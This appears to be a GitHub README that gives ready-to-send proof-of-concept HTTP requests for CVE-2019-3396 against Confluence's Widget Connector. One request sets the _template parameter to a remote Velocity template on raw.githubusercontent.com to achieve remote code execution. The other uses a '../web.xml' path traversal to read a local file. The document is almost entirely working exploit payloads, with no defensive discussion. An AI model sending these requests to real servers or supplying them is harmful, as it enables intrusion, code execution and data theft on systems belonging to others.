# CVE-2019-3396
Confluence Widget Connector path traversal (CVE-2019-3396)

RCE POC

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: x.x.x.x
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Content-Type: application/json; charset=utf-8
Referer: http://x.x.x.x/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Length: 168

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/x-f1v3/CVE-2019-3396/master/1.vm"}}}

```

modified from `https://github.com/pyn3rd/CVE-2019-3396`

LFI POC
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: x.x.x.x
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Content-Type: application/json; charset=utf-8
Referer: http://x.x.x.x/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Length: 168

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}
```
